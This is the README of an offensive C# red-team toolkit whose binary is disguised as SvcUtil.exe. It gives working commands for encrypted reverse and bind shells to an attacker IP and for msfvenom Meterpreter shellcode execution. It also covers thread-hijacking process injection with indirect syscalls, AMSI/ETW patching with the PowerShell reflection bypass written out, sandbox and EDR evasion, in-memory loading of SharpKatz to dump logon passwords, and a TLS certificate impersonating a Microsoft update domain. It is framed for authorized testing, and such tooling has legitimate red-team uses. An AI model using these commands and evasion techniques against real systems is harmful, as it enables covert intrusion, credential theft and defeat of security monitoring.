# Sharpcat

C# red team toolkit — enhanced netcat with OSEP-grade capabilities.
Rebuilt from [theart42/Sharpcat](https://github.com/theart42/Sharpcat).

## Build

### Option 1: build.bat (no SDK needed — uses built-in csc.exe)

```bash
# Just run the script — auto-detects csc.exe from .NET Framework
build.bat

# Debug build (with symbols)
build.bat Debug
```

Output: `SvcUtil.exe` in the project directory. Only requires .NET Framework 4.x which is pre-installed on Windows 10+, Windows 11, and Server 2019+. No Visual Studio or .NET SDK needed. Compatible with C# 5 / .NET Framework 4.0 csc.exe.

### Option 2: dotnet CLI (if .NET SDK installed)

```bash
dotnet build -c Release
```

---

## 1. Listener (Attacker Side)

`listener.py` is the dedicated listener with XOR encryption and TLS support. It replaces nc/ncat for encrypted sessions.

```
                  XOR key: "Sh4rpC4tK3y!@#"
  [Attacker]  ◄────────────────────────────  [Target]
  listener.py                               SvcUtil.exe
  port 4444                                 connects to attacker
```

### XOR encrypted (default)

```bash
# Default key — must match SvcUtil's built-in key
python3 listener.py 4444 "Sh4rpC4tK3y!@#"

# Custom key — must match -k on target side
python3 listener.py 4444 "MyCustomK3y!!"
```

### TLS encrypted

```bash
# Auto-generate self-signed cert
python3 listener.py --tls 4444

# Custom certificate (for persistent operations)
python3 listener.py --tls 4444 --cert server.pem --key server.key
```

### Plaintext (no encryption)

```bash
# No key argument = plaintext mode
python3 listener.py 4444

# Or use standard nc/ncat (plaintext only)
nc -lvnp 4444
```

> **Note:** XOR encryption requires `listener.py` with the matching key. Standard `nc`/`ncat` only works in plaintext mode (`-n`) or TLS mode (`--tls` with `ncat --ssl`).

---

## 2. Reverse Shell — XOR Encrypted

**Theory:** Reverse shell connects FROM the target TO the attacker, bypassing inbound firewall rules. Traffic is encrypted with a rolling XOR cipher using a shared key — both sides must use the same key or data becomes garbled. The default key is `Sh4rpC4tK3y!@#` (XOR-obfuscated in the binary), so if you don't specify `-k`, both sides already agree.

### Default key (built-in key matches on both sides)

```bash
# Attacker
python3 listener.py 4444 "Sh4rpC4tK3y!@#"

# Target — uses default key, no -k needed
SvcUtil.exe -c 10.10.14.1 4444
```

### Custom key (override default on both sides)

```bash
# Attacker — use custom key
python3 listener.py 4444 "MyCustomK3y!!"

# Target — must specify the SAME key with -k
SvcUtil.exe -c 10.10.14.1 4444 -k "MyCustomK3y!!"
```

### With PowerShell (auto AMSI/ETW bypass)

```bash
# Attacker
python3 listener.py 4444 "Sh4rpC4tK3y!@#"

# Target — -e powershell.exe triggers automatic AMSI/ETW bypass
SvcUtil.exe -c 10.10.14.1 4444 -e powershell.exe
```

### With auto-reconnect

```bash
# Attacker
python3 listener.py 4444 "Sh4rpC4tK3y!@#"

# Target — -r enables reconnect with exponential backoff if connection drops
SvcUtil.exe -c 10.10.14.1 4444 -e powershell.exe -r
```

### Plaintext (no encryption)

```bash
# Attacker — no key argument = plaintext mode
python3 listener.py 4444

# Target — -n disables encryption
SvcUtil.exe -c 10.10.14.1 4444 -n
```

---

## 3. Reverse Shell — TLS Encrypted

**Theory:** TLS provides real HTTPS-level encryption. Traffic appears as normal HTTPS to network monitoring tools (IDS/IPS), making it harder to detect than XOR. The listener auto-generates a self-signed certificate if you don't provide one. SvcUtil accepts any certificate by default (self-signed OK).

```
                    TLS 1.2/1.3
  [Attacker]  ◄═══════════════════════════  [Target]
  listener.py --tls                        SvcUtil.exe --tls
  auto-generated cert                      accepts any cert
```

### Auto-generated certificate (simplest)

```bash
# Attacker — auto-generates self-signed cert via openssl
python3 listener.py --tls 4444

# Target — --tls connects via TLS, accepts self-signed cert
SvcUtil.exe -c 10.10.14.1 4444 --tls
```

### Custom certificate (for persistent operations)

```bash
# Generate your own cert (once)
openssl req -x509 -newkey rsa:2048 -keyout server.key -out server.pem \
  -days 365 -nodes -subj "/CN=windows.update.microsoft.com"

# Attacker — use custom cert
python3 listener.py --tls 4444 --cert server.pem --key server.key

# Target — same command, cert validation is on listener side
SvcUtil.exe -c 10.10.14.1 4444 --tls
```

> **Note:** SvcUtil's TLS client accepts any certificate (callback returns true). The cert/key configuration is only on the listener side. Use a domain name in the cert's CN field that blends with normal traffic.

---

## 4. Bind Shell

**Theory:** Bind shell is the reverse — the target LISTENS on a port, and the attacker connects TO it. Useful when the target has a public IP or you have already pivoted into the network. Requires the target's firewall to allow inbound connections on that port.

```
                    XOR encrypted
  [Attacker]  ═══════════════════════════►  [Target]
  nc / listener.py                         SvcUtil.exe -l
  connects to target                       listens on port
```

```bash
# Target — listen on port 4444
SvcUtil.exe -l 4444

# Attacker — connect with netcat (plaintext, since nc doesn't do XOR)
nc 10.10.10.5 4444

# Or use SvcUtil on attacker side too (XOR encrypted both ways)
SvcUtil.exe -c 10.10.10.5 4444
```

---

## 5. Local Shellcode Execution

**Theory:** Executes shellcode in the current process using W^X (Write-then-Execute) technique. Memory is allocated as RW, shellcode is copied in, then protection is changed to RX. This avoids having RWX memory pages, which is a common detection indicator. Shellcode is zeroed from managed memory after execution (anti-forensics).

### Step 1: Generate shellcode

```bash
# Meterpreter reverse TCP (x64)
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=10.10.14.1 LPORT=443 -f raw -o payload.bin

# Convert to base64
base64 -w0 payload.bin > shellcode.txt
cat shellcode.txt
# Output: /EiD5PDowAAAAEFR... (long base64 string)
```

### Step 2a: Execute directly (base64 on command line)

```bash
# Start Metasploit handler first
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 10.10.14.1; set LPORT 443; run"

# Target — paste base64 directly
SvcUtil.exe -s /EiD5PDowAAAAEFR...
```

### Step 2b: Execute from file (for long shellcode)

```bash
# Target — load base64 from file (much easier for long payloads)
SvcUtil.exe -s shellcode.txt
```

> **Tip:** If the argument to `-s` is an existing file path, SvcUtil reads the base64 content from that file. Otherwise it treats the argument as the base64 string itself.

### With AES encryption (bypass static analysis)

```bash
# Encrypt the shellcode with a password
python3 -c "
import base64, hashlib, os
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

key = hashlib.sha256(b'MyPassword123').digest()
iv = os.urandom(16)
with open('payload.bin','rb') as f: sc = f.read()
cipher = AES.new(key, AES.MODE_CBC, iv)
ct = cipher.encrypt(pad(sc, 16))
# Output: IV + ciphertext, base64 encoded
print(base64.b64encode(iv + ct).decode())
" > encrypted.txt

# Target — decrypt and execute
SvcUtil.exe -s encrypted.txt -p MyPassword123
```

### Skip sandbox checks (for testing/debugging)

```bash
SvcUtil.exe -s shellcode.txt --no-sandbox
```

---

## 6. Process Injection — Threadless + Indirect Syscalls

**Theory:** Injects shellcode into another running process. Uses thread execution hijacking instead of CreateRemoteThread (which is heavily monitored by EDR). The technique suspends an existing thread in the target, redirects its instruction pointer (RIP) to the shellcode, then resumes it. All ntdll calls use indirect syscalls — SSNs are extracted from the clean on-disk ntdll.dll, and execution jumps through an in-memory `syscall;ret` gadget, bypassing userland hooks placed by EDR.

```
  SvcUtil.exe ──► target process (e.g. notepad.exe, PID 1234)
      │
      ├─ NtOpenProcess         ─── indirect syscall
      ├─ NtAllocateVirtualMemory (RW)
      ├─ NtWriteVirtualMemory   (copy shellcode)
      ├─ NtProtectVirtualMemory (RW → RX)
      ├─ Find thread via CreateToolhelp32Snapshot
      ├─ NtSuspendThread
      ├─ NtGetContextThread     (save RIP)
      ├─ NtSetContextThread     (RIP → shellcode)
      └─ NtResumeThread         (shellcode executes)
```

### By PID (numeric)

```bash
# Find target PID
tasklist | findstr notepad
# notepad.exe    1234    Console    1    12,345 K

# Start handler
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 10.10.14.1; set LPORT 443; run"

# Inject into PID 1234
SvcUtil.exe -i 1234 -s shellcode.txt
```

### By process name (auto-resolve PID)

```bash
# No need to look up PID — just use the process name
SvcUtil.exe -i notepad -s shellcode.txt

# With AES decryption
SvcUtil.exe -i explorer -s encrypted.txt -p MyPassword123
```

> **Note:** When using a process name, SvcUtil finds the first matching process via `Process.GetProcessesByName()`. Omit the `.exe` extension. x64 only.

---

## 7. File Transfer (within shell session)

**Theory:** Once you have a shell, you may need to transfer files. SvcUtil supports `!upload` and `!download` commands within the shell session, over the same encrypted channel.

```bash
# From the shell prompt:

# Upload file from attacker to target
!localupload /tmp/payload.exe C:\Windows\Temp\payload.exe

# Download file from target to attacker
!download C:\Users\admin\Desktop\secret.txt
```

---

## 8. Execute-Assembly (In-Memory .NET Loading)

**Theory:** Loads a .NET assembly (EXE) entirely in memory without touching disk. The assembly is transferred over the encrypted channel, loaded via `Assembly.Load(byte[])` in the SharpCat process, and its `Main()` is invoked with optional arguments. Because SharpCat's process already has AMSI and ETW patched, the loaded assembly is invisible to both — equivalent to Sliver's `execute-assembly` or Havoc's `dotnet inline-execute`, but without needing a full C2 framework.

```
  [Attacker]                              [Target]
  listener.py                             SvcUtil.exe (shell session)
      │                                       │
      │  !localexec SharpKatz.exe --Command   │
      │         logonpasswords                │
      ├──────────────────────────────────────►│
      │  !execute-assembly 45678 --Command    │
      │         logonpasswords                │
      │                                       ├─ AMSI/ETW already patched
      │  READY                                │
      │◄──────────────────────────────────────┤
      │  <45678 bytes of assembly>            │
      ├──────────────────────────────────────►│
      │                                       ├─ Assembly.Load(bytes)
      │                                       ├─ EntryPoint.Invoke(args)
      │  [captured stdout/stderr output]      │
      │◄──────────────────────────────────────┤
      │  DONE: assembly executed successfully │
      │◄──────────────────────────────────────┤
```

### From the listener (recommended)

```bash
# Load and execute SharpKatz in-memory on the target
!localexec /path/to/SharpKatz.exe --Command logonpasswords

# With arguments
!localexec /path/to/Seatbelt.exe -group=all

# Execute Rubeus
!localexec /tools/Rubeus.exe triage
```

### Raw protocol (advanced — for custom tooling)

```bash
# From any client that speaks the SharpCat protocol:
# Send: !execute-assembly <size_in_bytes> [args...]
# Wait for: READY
# Send: <raw assembly bytes>
# Receive: output + DONE/ERR
```

### Key advantages over PowerShell reflection

| | `!localexec` | PowerShell `Assembly.Load` |
|---|---|---|
| Disk touch | None | None |
| AMSI | Pre-patched in process | Must bypass separately |
| ScriptBlock Logging | Not applicable (no PowerShell) | Logs reflection commands |
| Forensic trace | Minimal — no PowerShell artifacts | PowerShell event logs |
| Crash isolation | Same process (crash = lost shell) | Same process |

> **Note:** The loaded assembly runs in the same process as SharpCat. If it crashes, the shell session is lost. Assembly bytes are zeroed from memory after execution (anti-forensics).

---

## 9. AMSI/ETW Bypass (How It Works)

**Theory:** When `-e powershell.exe` is used, SvcUtil automatically bypasses AMSI (Antimalware Scan Interface) and ETW (Event Tracing for Windows) to prevent Defender from scanning PowerShell commands and receiving telemetry events.

### Bypass Flow

```
  SvcUtil.exe spawns powershell.exe directly (no CREATE_SUSPENDED)
      │
      ├─ Step 1: Patch EtwEventWrite in ntdll.dll with RET (0xC3)
      │          → Defender stops receiving ETW events
      │
      ├─ Step 2: Patch AmsiScanBuffer in current process
      │          → xor eax,eax; ret (returns S_OK, "clean")
      │
      ├─ Step 3: Wait for PowerShell to initialize (~500ms)
      │
      ├─ Step 4: Send bypass commands via stdin (one line at a time):
      │          $c1=-join([char[]](83,121,115,...))     ← type name
      │          $c2=-join([char[]](97,109,115,...))     ← field name
      │          $r=[type]('R'+'ef')                    ← get Reflection
      │          $a=$r.Assembly                         ← get assembly
      │          $t=$a.GetType($c1)                     ← get AmsiUtils
      │          $t.GetField($c2,40).SetValue($null,$true)  ← set amsiInitFailed
      │
      ├─ Step 5: Drain pipe buffer
      │          → discard PowerShell banner + bypass command echoes
      │          → listener sees clean prompt only
      │
      └─ Result: PowerShell has AMSI disabled, clean output
```

### Why Direct Spawn + Stdin Reflection Works

Defender detects based on **behavioral patterns**, not static binary analysis:

- `CREATE_SUSPENDED` + cross-process `NtProtectVirtualMemory`/`NtWriteVirtualMemory` = classic process injection pattern → **always detected**
- Direct spawn (no `CREATE_SUSPENDED`) + stdin-only bypass = **normal parent-child relationship** — no suspicious memory operations
- Each bypass command line is **individually harmless** to AMSI scanning (char code arrays, string concatenation)
- Pipe buffer drain after bypass removes banner + command echoes — listener output is clean

### Anti-Detection Techniques

| Technique | Purpose |
|-----------|---------|
| Runtime patch construction | `xor eax,eax; ret` bytes built via arithmetic at runtime — no static `{ 0x31, 0xC0, 0xC3 }` array in binary |
| `[MethodImpl(NoInlining)]` | Prevents compiler from inlining the zero-byte generator function |
| `Environment.TickCount - TickCount` | Always equals 0, but static analysis can't resolve it |
| `[type]('R'+'ef')` | String concatenation avoids AMSI pattern matching on `[Ref]` |
| Char code arrays | Type/field names built from integer arrays, not string literals |
| Pipe drain after bypass | Discards PowerShell banner + bypass command echoes from output |
| XOR-encoded strings | All sensitive strings (amsi.dll, AmsiScanBuffer, etc.) stored as XOR byte arrays |
| No cross-process writes | Entire bypass via stdin pipe — no suspicious memory operations |

---

## Flags Reference

| Flag | Description |
|------|-------------|
| `<IP> <PORT>` | Reverse shell (positional, backward compatible) |
| `-c host port` | Reverse shell: connect to host:port |
| `-l port` | Bind shell: listen on port |
| `-e cmd` | Command to execute (default: cmd.exe) |
| `-k key` | XOR traffic encryption key (must match listener) |
| `-r` | Auto-reconnect on disconnect (exponential backoff + jitter) |
| `-n` | No encryption (plaintext) |
| `-a` | Force AMSI/ETW bypass |
| `--no-amsi` | Disable auto AMSI bypass |
| `--tls` | Use TLS instead of XOR |
| `-s base64\|file` | Shellcode: base64 string or path to file containing base64 |
| `-p password` | AES decryption password for shellcode |
| `-i pid\|name` | Target for injection: PID number or process name (e.g. `notepad`) |
| `--no-sandbox` | Skip sandbox evasion checks |

---

## Architecture

```
Program.cs           Entry point, argument parsing, mode dispatch
├── Config.cs        XOR-obfuscated defaults (IP, port, command, key)
├── DynInvoke.cs     Dynamic P/Invoke — runtime API resolution (no static IAT entries)
├── Connection.cs    TCP connectivity: reverse, bind, reconnect with exponential backoff
│
├── Shell Mode
│   ├── Shell.cs           Process spawn with piped stdin/stdout/stderr
│   ├── IShellStream.cs    Interface for polymorphic stream handling
│   ├── Crypto.cs          XOR rolling-key stream cipher
│   ├── TlsStream.cs       SslStream wrapper — real TLS 1.2/1.3
│   ├── FileTransfer.cs    !upload / !download protocol
│   ├── AssemblyRunner.cs  !execute-assembly — in-memory .NET assembly loader
│   └── ScanPatch.cs       AMSI/ETW bypass (local patch + stdin reflection)
│
├── Shellcode Mode
│   ├── AesCrypto.cs       AES-CBC payload encryption/decryption
│   ├── PayloadRunner.cs   W^X local shellcode execution
│   ├── EnvCheck.cs        5-gate sandbox/emulator detection
│   ├── Syscall.cs         Indirect syscall engine (SSN + gadget jump)
│   └── RemoteLoader.cs    Thread hijacking via indirect syscalls
│
├── listener.py      Python listener with XOR/TLS support
└── build.bat        Build script (csc.exe, no SDK needed)
```

## Evasion Techniques

| Technique | Module | How it works |
|-----------|--------|--------------|
| Execute-Assembly | AssemblyRunner.cs | In-memory .NET assembly load via `Assembly.Load(byte[])` — no disk, no PowerShell |
| Dynamic P/Invoke | DynInvoke.cs | Only LoadLibraryA/GetProcAddress in IAT — all other APIs resolved at runtime |
| Indirect Syscalls | Syscall.cs | SSN from clean disk ntdll + jump through in-memory `syscall;ret` gadget |
| Threadless Injection | RemoteLoader.cs | Thread execution hijacking — no CreateRemoteThread call |
| W^X Shellcode | PayloadRunner.cs | Allocate RW, copy, change to RX — never RWX |
| AMSI Bypass | ScanPatch.cs | Local AmsiScanBuffer patch + stdin reflection bypass in PowerShell |
| ETW Bypass | ScanPatch.cs | Patch EtwEventWrite with RET before AMSI bypass |
| Pipe Drain | Shell.cs | Discard bypass command echoes — clean listener output |
| Runtime Patch | ScanPatch.cs | Patch bytes built at runtime via arithmetic — no static byte arrays |
| AES Payload Encryption | AesCrypto.cs | AES-CBC with SHA256 key derivation — shellcode encrypted at rest |
| Sandbox Evasion | EnvCheck.cs | Sleep timing, VirtualAllocExNuma, FlsAlloc, CPU count, uptime |
| TLS Encryption | TlsStream.cs | Real TLS — traffic indistinguishable from HTTPS |
| XOR String Obfuscation | All files | All sensitive strings stored as pre-computed XOR byte arrays |
| Traffic Encryption | Crypto.cs | Rolling XOR cipher for network traffic |

## Changing Default Configuration

Edit `Config.cs` and use the `Encode()` method to generate XOR-encoded byte arrays:

```csharp
byte[] encoded = Config.Encode("192.168.1.100");
// Copy the result into DefaultIpEncoded
```

## Requirements

- Windows 7+ / Server 2008 R2+
- .NET Framework 4.x (pre-installed on Windows)
- x64 (indirect syscalls + thread hijacking are x64 only)

## Known Limitations

- Threadless injection and indirect syscalls are x64 only
- TLS bind shell not supported (requires runtime certificate generation)
- AES uses SHA256 key derivation (no PBKDF2/salt) — adequate for payload protection, not for password storage
- AES-CBC without HMAC — sufficient for payload decryption, not for authenticated encryption

## License

For authorized security testing and educational purposes only.
